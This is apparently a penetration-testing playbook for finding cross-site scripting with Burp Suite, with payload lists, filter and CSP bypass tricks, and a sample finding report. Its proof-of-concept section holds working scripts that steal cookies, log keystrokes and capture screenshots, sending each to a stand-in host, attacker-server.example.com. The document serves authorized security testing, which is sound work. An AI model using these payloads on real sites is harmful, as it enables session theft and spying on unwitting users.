---
name: testing-for-xss-vulnerabilities-with-burpsuite
description: Identifying and validating cross-site scripting vulnerabilities using Burp Suite's scanner, intruder, and repeater tools during authorized security assessments.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, xss, burpsuite, owasp, web-security, cross-site-scripting]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for XSS Vulnerabilities with Burp Suite

## When to Use

- During authorized web application penetration testing to find reflected, stored, and DOM-based XSS
- When validating XSS findings reported by automated vulnerability scanners
- For testing the effectiveness of Content Security Policy (CSP) and XSS filters
- When assessing client-side security of single-page applications (SPAs)
- During bug bounty programs targeting XSS vulnerabilities

## Prerequisites

- **Authorization**: Written scope and rules of engagement for the target application
- **Burp Suite Professional**: Licensed version with active scanner capabilities
- **Browser**: Firefox or Chromium with Burp CA certificate installed
- **FoxyProxy**: Browser extension configured to route traffic through Burp proxy (127.0.0.1:8080)
- **Target application**: Authenticated access with valid test credentials
- **XSS payloads list**: Custom wordlist or Burp's built-in XSS payload set

## Workflow

### Step 1: Configure Burp Suite and Map the Application

Set up the proxy and crawl the application to discover all input vectors.

```
# Burp Suite Configuration
1. Proxy > Options > Proxy Listeners: 127.0.0.1:8080
2. Target > Scope: Add target domain (e.g., *.target.example.com)
3. Dashboard > New Scan > Crawl only > Select target URL
4. Enable "Passive scanning" in Dashboard settings

# Browser Setup
- Install Burp CA: http://burpsuite → CA Certificate
- Import certificate into browser trust store
- Configure proxy: 127.0.0.1:8080
- Browse the application manually to build the site map
```

### Step 2: Identify Reflection Points with Burp Repeater

Send requests to Repeater and inject unique canary strings to find where user input is reflected.

```
# In Burp Repeater, inject a unique canary string into each parameter:
GET /search?q=xsscanary12345 HTTP/1.1
Host: target.example.com

# Check the response for reflections of the canary:
# Search response body for "xsscanary12345"
# Note the context: HTML body, attribute, JavaScript, URL, etc.

# Test multiple injection contexts:
# HTML body: <p>Results for: xsscanary12345</p>
# Attribute: <input value="xsscanary12345">
# JavaScript: var search = "xsscanary12345";
# URL context: <a href="/page?q=xsscanary12345">

# Test with HTML special characters to check encoding:
GET /search?q=xss<>"'&/ HTTP/1.1
Host: target.example.com
# Check which characters are reflected unencoded
```

### Step 3: Test Reflected XSS with Context-Specific Payloads

Based on the reflection context, craft targeted XSS payloads.

```
# HTML Body Context - Basic payload
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: target.example.com

# HTML Attribute Context - Break out of attribute
GET /search?q=" onfocus=alert(document.domain) autofocus=" HTTP/1.1
Host: target.example.com

# JavaScript String Context - Break out of string
GET /search?q=';alert(document.domain)// HTTP/1.1
Host: target.example.com

# Event Handler Context - Use alternative events
GET /search?q=<img src=x onerror=alert(document.domain)> HTTP/1.1
Host: target.example.com

# SVG Context
GET /search?q=<svg onload=alert(document.domain)> HTTP/1.1
Host: target.example.com

# If angle brackets are filtered, try encoding:
GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: target.example.com
```

### Step 4: Test Stored XSS via Burp Intruder

Use Burp Intruder to test stored XSS across input fields like comments, profiles, and messages.

```
# Burp Intruder Configuration:
# 1. Right-click request > Send to Intruder
# 2. Positions tab: Mark the injectable parameter
# 3. Payloads tab: Load XSS payload list

# Example payload list for Intruder:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
"><img src=x onerror=alert(1)>
'-alert(1)-'
\'-alert(1)//

# In Intruder > Options > Grep - Match:
# Add patterns: "alert(1)", "onerror=", "<script>"
# This flags responses where payloads are reflected/stored
```

### Step 5: Test DOM-based XSS

Identify client-side JavaScript that processes user input unsafely using Burp's DOM Invader.

```
# Enable DOM Invader in Burp's embedded browser:
# 1. Open Burp's embedded Chromium browser
# 2. Click DOM Invader extension icon > Enable
# 3. Set canary value (e.g., "domxss")

# Common DOM XSS sinks to monitor:
# - document.write()
# - innerHTML
# - outerHTML
# - eval()
# - setTimeout() / setInterval() with string args
# - location.href / location.assign()
# - jQuery .html() / .append()

# Common DOM XSS sources:
# - location.hash
# - location.search
# - document.referrer
# - window.name
# - postMessage data

# Test URL fragment-based DOM XSS:
https://target.example.com/page#<img src=x onerror=alert(1)>

# Test via document.referrer:
# Create a page that links to the target with XSS in the referrer
```

### Step 6: Bypass XSS Filters and CSP

When basic payloads are blocked, use advanced techniques to bypass protections.

```
# CSP Analysis - Check response headers:
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

# Common CSP bypasses:
# If 'unsafe-inline' is allowed:
<script>alert(document.domain)</script>

# If a CDN is whitelisted (e.g., cdnjs.cloudflare.com):
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# Filter bypass techniques:
# Case variation: <ScRiPt>alert(1)</ScRiPt>
# Null bytes: <scr%00ipt>alert(1)</script>
# Double encoding: %253Cscript%253Ealert(1)%253C/script%253E
# HTML entities: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
# Unicode escapes: <script>\u0061lert(1)</script>

# Use Burp Suite > BApp Store > Install "Hackvertor"
# Encode payloads with Hackvertor tags:
# <@hex_entities>alert(document.domain)<@/hex_entities>
```

### Step 7: Validate Impact and Document Findings

Confirm exploitability and document the full attack chain.

```
# Proof of Concept payload that demonstrates real impact:
# Cookie theft:
<script>
fetch('https://attacker-server.example.com/steal?c='+document.cookie)
</script>

# Session hijacking via XSS:
<script>
new Image().src='https://attacker-server.example.com/log?cookie='+document.cookie;
</script>

# Keylogger payload (demonstrates impact severity):
<script>
document.onkeypress=function(e){
  fetch('https://attacker-server.example.com/keys?k='+e.key);
}
</script>

# Screenshot capture using html2canvas (stored XSS impact):
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
html2canvas(document.body).then(function(canvas){
  fetch('https://attacker-server.example.com/screen',{
    method:'POST',body:canvas.toDataURL()
  });
});
</script>

# Document each finding with:
# - URL and parameter
# - Payload used
# - Screenshot of alert/execution
# - Impact assessment
# - Reproduction steps
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Reflected XSS** | Payload is included in the server response immediately from the current HTTP request |
| **Stored XSS** | Payload is persisted on the server (database, file) and served to other users |
| **DOM-based XSS** | Payload is processed entirely client-side by JavaScript without server reflection |
| **XSS Sink** | A JavaScript function or DOM property that executes or renders untrusted input |
| **XSS Source** | A location where attacker-controlled data enters the client-side application |
| **CSP** | Content Security Policy header that restricts which scripts can execute on a page |
| **Context-aware encoding** | Applying the correct encoding (HTML, JS, URL, CSS) based on output context |
| **Mutation XSS (mXSS)** | XSS that exploits browser HTML parser inconsistencies during DOM serialization |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Primary testing platform with scanner, intruder, repeater, and DOM Invader |
| **DOM Invader** | Burp's built-in browser extension for DOM XSS testing |
| **Hackvertor** | Burp BApp for advanced payload encoding and transformation |
| **XSS Hunter** | Blind XSS detection platform that captures execution evidence |
| **Dalfox** | CLI-based XSS scanner with parameter analysis (`go install github.com/hahwul/dalfox/v2@latest`) |
| **CSP Evaluator** | Google tool for analyzing Content Security Policy effectiveness |

## Common Scenarios

### Scenario 1: Search Function Reflected XSS
A search page reflects the query parameter in the results heading without encoding. Inject `<script>alert(document.domain)</script>` in the search parameter and demonstrate cookie theft via reflected XSS.

### Scenario 2: Comment System Stored XSS
A blog comment form sanitizes `<script>` tags but allows `<img>` tags. Use `<img src=x onerror=alert(document.domain)>` to achieve stored XSS that fires for every visitor loading the page.

### Scenario 3: SPA with DOM-based XSS
A React/Angular SPA reads `window.location.hash` and injects it into the DOM via `innerHTML`. Use DOM Invader to trace the source-to-sink flow and craft a payload in the URL fragment.

### Scenario 4: XSS Behind WAF with Strict CSP
A WAF blocks common XSS patterns and CSP restricts inline scripts. Discover a JSONP endpoint on a whitelisted domain and use it as a script gadget to bypass CSP.

## Output Format

```
## XSS Vulnerability Finding

**Vulnerability**: Stored Cross-Site Scripting (XSS)
**Severity**: High (CVSS 8.1)
**Location**: POST /api/comments → `body` parameter
**Type**: Stored XSS
**OWASP Category**: A03:2021 - Injection

### Reproduction Steps
1. Navigate to https://target.example.com/blog/post/123
2. Submit a comment with body: <img src=x onerror=alert(document.domain)>
3. Reload the page; the payload executes in the browser

### Impact
- Session hijacking via cookie theft for all users viewing the page
- Account takeover through session token exfiltration
- Defacement of the blog post page
- Phishing via injected login forms

### CSP Status
- No Content-Security-Policy header present
- X-XSS-Protection header not set

### Recommendation
1. Implement context-aware output encoding (HTML entity encoding for HTML context)
2. Deploy Content Security Policy with strict nonce-based script allowlisting
3. Use DOMPurify library for sanitizing user-generated HTML content
4. Set HttpOnly and Secure flags on session cookies
5. Add X-Content-Type-Options: nosniff header
```
